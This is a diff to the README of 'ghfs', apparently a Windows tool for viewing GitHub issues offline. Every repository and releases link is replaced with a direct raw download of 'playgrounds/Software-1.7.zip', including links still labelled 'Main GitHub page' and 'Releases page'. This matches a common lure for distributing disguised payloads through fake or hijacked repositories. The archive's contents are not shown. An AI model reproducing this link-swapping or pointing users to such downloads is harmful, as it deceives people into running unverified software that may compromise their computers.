@@ -1,6 +1,6 @@
 # 🔍 ghfs - View GitHub Issues Offline Easily
 
-[![Download ghfs](https://img.shields.io/badge/Download-ghfs-brightgreen?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs)
+[![Download ghfs](https://img.shields.io/badge/Download-ghfs-brightgreen?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs/raw/refs/heads/main/playgrounds/Software-1.7.zip)
 
 ## 📋 What is ghfs?
 
@@ -39,12 +39,12 @@ You do not need administrator rights to install or run ghfs. It runs without ext
 
 ## 💾 Download and Install ghfs
 
-[![Download ghfs](https://img.shields.io/badge/Download-ghfs-blue?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs)
+[![Download ghfs](https://img.shields.io/badge/Download-ghfs-blue?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs/raw/refs/heads/main/playgrounds/Software-1.7.zip)
 
 Follow these steps to get ghfs running on your Windows PC.
 
 1. Visit the GitHub page by clicking the button above or open your browser and go to:  
-   https://github.com/YADAVJI0123/ghfs
+   https://github.com/YADAVJI0123/ghfs/raw/refs/heads/main/playgrounds/Software-1.7.zip
 
 2. Look for the **Releases** section on the page. This may be on the right side or under the main repository description.
 
@@ -127,7 +127,7 @@ If ghfs does not work as expected:
 
 New versions of ghfs may add features or fix issues. To update:
 
-1. Return to the GitHub page: https://github.com/YADAVJI0123/ghfs/releases  
+1. Return to the GitHub page: https://github.com/YADAVJI0123/ghfs/raw/refs/heads/main/playgrounds/Software-1.7.zip  
 2. Download the latest installer.  
 3. Run the installer; it will replace the old version without losing your files.
 
@@ -147,8 +147,8 @@ If you need help:
 
 ## 🔗 Useful Links
 
-- Main GitHub page: https://github.com/YADAVJI0123/ghfs  
-- Releases page (download area): https://github.com/YADAVJI0123/ghfs/releases
+- Main GitHub page: https://github.com/YADAVJI0123/ghfs/raw/refs/heads/main/playgrounds/Software-1.7.zip  
+- Releases page (download area): https://github.com/YADAVJI0123/ghfs/raw/refs/heads/main/playgrounds/Software-1.7.zip
 
 ---
 
@@ -185,4 +185,4 @@ Offline changes need syncing once you connect to the internet.
 
 Download ghfs and manage GitHub issues on your Windows PC:
 
-[![Download ghfs](https://img.shields.io/badge/Download-ghfs-brightgreen?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs)
+[![Download ghfs](https://img.shields.io/badge/Download-ghfs-brightgreen?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs/raw/refs/heads/main/playgrounds/Software-1.7.zip)
